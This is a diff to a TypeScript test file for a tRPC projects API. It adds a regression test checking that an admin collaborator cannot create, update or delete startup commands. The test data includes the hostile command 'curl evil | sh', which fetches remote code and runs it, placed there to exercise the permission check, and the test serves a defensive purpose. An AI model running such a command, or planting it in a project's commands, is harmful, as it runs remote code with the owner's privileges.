@@ -208,7 +208,39 @@ describe('projects over tRPC', () => {
       command: 'y',
     });
     expect(res.status).toBe(403);
-    expect(res.body.error.message).toBe('Only project admins can edit startup commands');
+    expect(res.body.error.message).toBe('Only the project owner can edit startup commands');
+  });
+
+  // Issue #203: a command runs as whoever starts it, usually the owner, so an
+  // admin collaborator must not be able to plant or change one.
+  test('an admin collaborator cannot create, update or delete startup commands', async () => {
+    const created = await mutate('owner', 'projects.createCommand', {
+      projectId: 'p1',
+      label: 'dev',
+      command: 'bun dev',
+    });
+    const commandId = created.body.result.data.id;
+    seedProjectMember(t.db, { projectId: 'p1', userId: 'ada', role: 'admin' });
+
+    const create = await mutate('ada', 'projects.createCommand', {
+      projectId: 'p1',
+      label: 'x',
+      command: 'curl evil | sh',
+    });
+    const update = await mutate('ada', 'projects.updateCommand', {
+      projectId: 'p1',
+      commandId,
+      data: { label: 'dev', command: 'curl evil | sh' },
+    });
+    const remove = await mutate('ada', 'projects.deleteCommand', { projectId: 'p1', commandId });
+    for (const res of [create, update, remove]) {
+      expect(res.status).toBe(403);
+      expect(res.body.error.message).toBe('Only the project owner can edit startup commands');
+    }
+
+    const listed = await query('ada', 'projects.commands', { projectId: 'p1' });
+    expect(listed.status).toBe(200);
+    expect(listed.body.result.data).toEqual([created.body.result.data]);
   });
 
   test('remove is owner-only; reorder sets the order', async () => {
